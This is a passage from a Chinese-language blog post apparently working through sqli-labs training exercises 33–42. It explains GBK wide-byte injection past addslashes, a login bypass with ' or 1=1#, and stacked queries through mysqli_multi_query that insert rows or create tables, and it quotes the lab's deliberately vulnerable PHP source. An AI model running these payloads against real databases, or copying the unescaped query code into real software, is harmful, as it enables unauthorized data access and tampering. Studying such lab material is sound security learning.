<p>如果根据其查询语句，我们构造的payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">'#</span></span><br><span class="line"><span class="string">或者?id=1%27%23</span></span><br></pre></td></tr></table></figure></p>
<p>然后此时在函数check_addslashes()的作用下，”‘“将会被转换成”\’”;<br>所以在数据传输到数据库之前,payload会变为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%<span class="number">5</span>c%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>而源码中的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br></pre></td></tr></table></figure></p>
<p>这个函数将mysql的三个字符集设置为gbk，而gbk有一个特点就是<strong>两个字符为一个汉字，例如%aa%5c 就是一个<br>汉字（前一个 ascii 码大于 128 才能到汉字的范围）</strong></p>
<p>所以此时我们输入的payload中的 %5c%27 将被作为一个汉字进行处理，就此注入失败。</p>
<p>所以我们这里修改payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>转义后就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">5</span>c%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>和上面一样，此时%df%5c作为一个字符传输进去，后面的%27%23不受影响。<br>可见这道题意在过滤掉”‘“.<br>所以这里我们构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%df%<span class="number">27</span>union%<span class="number">20</span>select%<span class="number">201</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-34"><a href="#sqlilab-34" class="headerlink" title="sqlilab-34"></a>sqlilab-34</h1><p>先来介绍一下函数addslashes()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line"></span><br><span class="line">预定义字符是：</span><br><span class="line"></span><br><span class="line">  单引号（<span class="string">'）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  双引号（"）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  反斜杠（\）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  NULL</span></span><br></pre></td></tr></table></figure></p>
<p>观察源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $uname1=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">    $passwd1=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//echo "username before addslashes is :".$uname1 ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password before addslashes is : ".$passwd1. "&lt;br&gt;";</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">    $fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">    fwrite($fp,<span class="string">'User Name:'</span>.$uname1);</span><br><span class="line">    fwrite($fp,<span class="string">'Password:'</span>.$passwd1.<span class="string">"\n"</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line">        </span><br><span class="line">        $uname = addslashes($uname1);</span><br><span class="line">        $passwd= addslashes($passwd1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//echo "username after addslashes is :".$uname ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password after addslashes is : ".$passwd;    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// connectivity </span></span><br><span class="line">    mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">    @$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure></p>
<p>观察到在源码中有这么一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = addslashes($uname1);</span><br><span class="line">$passwd= addslashes($passwd1);</span><br></pre></td></tr></table></figure></p>
<p>也就是说我们所POST的uname还有passwd将会被转义<br>同样的数据库的编码被设置为GBK，这里我们将需要把utf8转换为utf16，也就是说 “ ‘ “要转换为 “ � ‘ “。<br>payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:� <span class="string">' or 1=1#</span></span><br><span class="line"><span class="string">password:随便填</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-38-堆叠注入"><a href="#sqlilab-38-堆叠注入" class="headerlink" title="sqlilab-38(堆叠注入)"></a>sqlilab-38(堆叠注入)</h1><p>参考文章<a href="http://php.net/manual/zh/mysqli.multi-query.php" target="_blank" rel="noopener">http://php.net/manual/zh/mysqli.multi-query.php</a><br>参考文章<a href="https://www.jianshu.com/p/c50ced83414d" target="_blank" rel="noopener">https://www.jianshu.com/p/c50ced83414d</a></p>
<p>介绍函数mysqli_multi_query()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query():</span><br><span class="line"></span><br><span class="line">执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。</span><br></pre></td></tr></table></figure></p>
<p>利用这个函数</p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);   </span><br><span class="line">$username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;font size = "5" color= "#00FF00"&gt;'</span>;  </span><br><span class="line">            printf(<span class="string">"Your Username is : %s"</span>, $row[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            printf(<span class="string">"Your Password is : %s"</span>, $row[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>所以构造payload如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">'; insert into users(id,username,password) value (66,'</span>acca<span class="string">','</span>bbc<span class="string">')--+</span></span><br></pre></td></tr></table></figure></p>
<p>尝试对数据库进行数据的添加操作<br><img src="/2019/01/28/巩固sql注入/20.png" alt=""></p>
<p>由此一个堆叠注入完成，实际上在真正应用中堆叠注入并不是在大部分情况下能够成功过的，其局限性还是很大的。在php源码中要有mysqli_multi_query()这个函数，并且数据库引擎支持的情况下才可以进行。</p>
<h1 id="sqlilab-42"><a href="#sqlilab-42" class="headerlink" title="sqlilab-42"></a>sqlilab-42</h1><p>观察下列源码：(login.php)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">($host,$dbuser,$dbpass, $dbname)</span></span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* execute multi query */</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">   <span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>($result = @mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">     <span class="keyword">if</span>($row = @mysqli_fetch_row($result))</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>发现username被转义，而password并未被转义，那么payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin(随便写)</span><br><span class="line">password：<span class="number">-1</span><span class="string">';create table test2 like users#</span></span><br></pre></td></tr></table></figure></p>
</section><nav id="post-nav"><span class="prev"><a href="/2019/01/31/mysql注入常见load-file路径/"><span class="arrow">←</span>Newer Posts</a></span><span class="next"><a href="/2019/01/25/sql基础语法的二次学习/">Older Posts<span class="arrow">→</span></a></span></nav></article></section><footer id="footer"><div id="social"><a class="symbol" href="https://github.com/fuzhouxxdong"><i class="fa fa-github"></i></a></div><p class="small">© Copyright 2018 &nbsp;<i class="fa fa-heart" aria-hidden="true">&nbsp;Dxx</i></p><p class="small">Powered by &nbsp;<a href="https://hexo.io/">Hexo &nbsp;</a>Theme By &nbsp;<a href="https://github.com/fuzhouxxdong/hexo-theme-dxx">Dxx</a></p></footer><script>hljs.initHighlightingOnLoad();</script></body></html>